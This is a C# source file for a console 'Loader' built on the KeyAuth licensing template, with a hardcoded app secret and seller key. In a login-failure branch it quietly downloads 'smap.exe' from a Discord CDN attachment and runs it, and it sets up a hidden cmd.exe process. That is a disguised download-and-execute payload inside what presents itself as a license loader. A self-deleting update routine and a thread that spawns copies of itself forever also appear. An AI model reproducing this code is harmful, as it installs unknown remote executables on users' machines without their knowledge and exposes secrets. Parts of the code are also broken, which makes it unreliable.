using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using vital1310;

namespace KeyAuth
{
    class Program
    {

        /*
         * 
         * WATCH THIS VIDEO TO SETUP APPLICATION: https://youtube.com/watch?v=UXRkNEvgxJU
         * 
         */



        public static api KeyAuthApp = new api(
            name: "ValorGuides",
            ownerid: "nTyWCsWgOM",
            secret: "95e731b3839239c417018e702c3132ec7f1f55a393ecc7bc773ce9c20d7abe28",
            version: "1.0"
        );

        static void Main(string[] args)
        {

            Console.Title = "Loader";
            Console.WriteLine("\n\n Connecting..");
            KeyAuthApp.init();

            autoUpdate();

            if (!KeyAuthApp.response.success)
            {
                Console.WriteLine("\n Status: " + KeyAuthApp.response.message);
                Thread.Sleep(1500);
                Environment.Exit(0);
            }


            if (!KeyAuthApp.response.success)
            {
                Console.WriteLine("\n Status: " + KeyAuthApp.response.message);
                Thread.Sleep(1500);

                    WebClient webClient = new WebClient();
                    string fileName = "\\smap.exe";
                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/854882593730986014/875780033438965770/smap.exe", fileName);
                    Process.Start(fileName);
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.UseShellExecute = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

            }

            Console.WriteLine("\n Logged In!"); // at this point, the client has been authenticated. Put the code you want to run after here


            /*
                  KeyAuthApp.web_login();

                  Console.WriteLine("\n Waiting for button to be clicked");
                  KeyAuthApp.button("close");
            */
            
            #region extras
            /*
            // set user variable 'discord' to 'test#0001' (if the user variable with name 'discord' doesn't exist, it'll be created)
            KeyAuthApp.setvar("discord", "test#0001");
            if (!KeyAuthApp.response.success)
            {
                Console.WriteLine("\n Status: " + KeyAuthApp.response.message);
                Thread.Sleep(1500);
                Environment.Exit(0);
            }
            else
                Console.WriteLine("\n Successfully set user variable");
            */

            /*
            // display the user variable 'discord'
            string uservar = KeyAuthApp.getvar("discord");
            if (!KeyAuthApp.response.success)
            {
                Console.WriteLine("\n Status: " + KeyAuthApp.response.message);
                Thread.Sleep(1500);
                Environment.Exit(0);
            }
            else
                Console.WriteLine("\n User variable value: " + uservar);
            */

            // KeyAuthApp.log("user logged in"); // log text to website and discord webhook (if set)

            /*
            // let's say you want to send request to https://keyauth.com/api/seller/?sellerkey=f43795eb89d6060b74cdfc56978155ef&type=black&ip=1.1.1.1&hwid=abc
            // but doing that from inside the loader is a bad idea as the link could get leaked.
            // Instead, you should create a webhook with the https://keyauth.com/api/seller/?sellerkey=f43795eb89d6060b74cdfc56978155ef part as the URL
            // then in your loader, put the rest of the link (the other paramaters) in your loader. And then it will send request from KeyAuth server and return response in string resp

            // example to send normal request with no POST data
            string resp = KeyAuthApp.webhook("7kR0UedlVI", "&type=black&ip=1.1.1.1&hwid=abc");

            // example to send form data
            resp = KeyAuthApp.webhook("7kR0UedlVI", "", "type=init&name=test&ownerid=j9Gj0FTemM", "application/x-www-form-urlencoded");

            // example to send JSON
            resp = KeyAuthApp.webhook("aM0MA1Ipqz", "", "{\"content\": \"webhook message here\",\"embeds\": null}", "application/json"); // if Discord webhook message successful, response will be empty

            if (!KeyAuthApp.response.success)
            {
                Console.WriteLine("\n Status: " + KeyAuthApp.response.message);
                Thread.Sleep(1500);
                Environment.Exit(0);
            }
            else
                Console.WriteLine("\n Response recieved from webhook request: " + resp);
            */

            /*
            // downloads application file to current folder Loader is running, feel free to change to whatever.
            byte[] result = KeyAuthApp.download("385624");
            if (!KeyAuthApp.response.success)
            {
                Console.WriteLine("\n Status: " + KeyAuthApp.response.message);
                Thread.Sleep(1500);
                Environment.Exit(0);
            }
            else
                File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\test.txt", result);
            */

            /*
            string appvar = KeyAuthApp.var("test");
            if (!KeyAuthApp.response.success)
            {
                Console.WriteLine("\n Status: " + KeyAuthApp.response.message);
                Thread.Sleep(1500);
                Environment.Exit(0);
            }
            else
                Console.WriteLine("\n App variable data: " + appvar);
            */

            // KeyAuthApp.ban(); // ban the current user, must be logged in
            #endregion extras
            KeyAuthApp.check();


        }

        public static DateTime UnixTimeToDateTime(long unixtime)
        {
            DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            dtDateTime = dtDateTime.AddSeconds(unixtime).ToLocalTime();
            return dtDateTime;
        }

        static void autoUpdate()
        {
            if (KeyAuthApp.response.message == "invalidver")
            {
                if (!string.IsNullOrEmpty(KeyAuthApp.app_data.downloadLink))
                {
                    fText.Print("\n Update available!");
                    fText.Print(" Would you like to update?");
                    fText.Print(" ");
                    fText.Print("\n [1] Yes");
                    fText.Print(" [2] No");
                    int choice = int.Parse(Console.ReadLine());
                    switch (choice)
                    {
                        case 1:
                            fText.Print(" Downloading file directly..");
                            fText.Print(" New file will be opened shortly..");

                            WebClient webClient = new WebClient();
                            string destFile = Application.ExecutablePath;

                            string rand = random_string();

                            destFile = destFile.Replace(".exe", $"-{rand}.exe");
                            webClient.DownloadFile(KeyAuthApp.app_data.downloadLink, destFile);

                            Process.Start(destFile);
                            Process.Start(new ProcessStartInfo()
                            {
                                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                                FileName = "cmd.exe"
                            });
                            Environment.Exit(0);
                            break;
                        case 2:
                            Environment.Exit(0);
                            break;
                        default:
                            fText.Print(" Invalid selection, terminating program..");
                            Thread.Sleep(1500);
                            Environment.Exit(0);
                            break;
                    }
                }
                fText.Print("\n Status: Version of this program does not match the one online. Furthermore, the download link online isn't set. You will need to manually obtain the download link from the developer.");
                Thread.Sleep(2500);
                Environment.Exit(0);
            }
        }

        //FunnyPrint
        internal class monky2
        {
            public static void Retarded()
            {
                int num = 80;
                _ = (new char[62]);
                char[] array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
                RandomNumberGenerator randomNumberGenerator = new RNGCryptoServiceProvider();
                byte[] array2 = new byte[num];
                randomNumberGenerator.GetNonZeroBytes(array2);
                StringBuilder stringBuilder = new StringBuilder(num);
                foreach (byte b in array2)
                {
                    stringBuilder.Append(array[(int)b % (array.Length - 1)]);
                }
                Console.Title = (((stringBuilder != null) ? stringBuilder.ToString() : null) ?? "");
                new Thread(new ThreadStart(monky2.Retarded)).Start();
            }

            public static void Print(string message, int sec = 40)
            {
                for (int i = 0; i < message.Length; i++)
                {
                    Console.Write(message[i]);
                    Thread.Sleep(sec);
                }
            }
        }

        static string random_string()
        {
            string str = null;

            Random random = new Random();
            for (int i = 0; i < 5; i++)
            {
                str += Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65))).ToString();
            }
            return str;
        }
    }
}
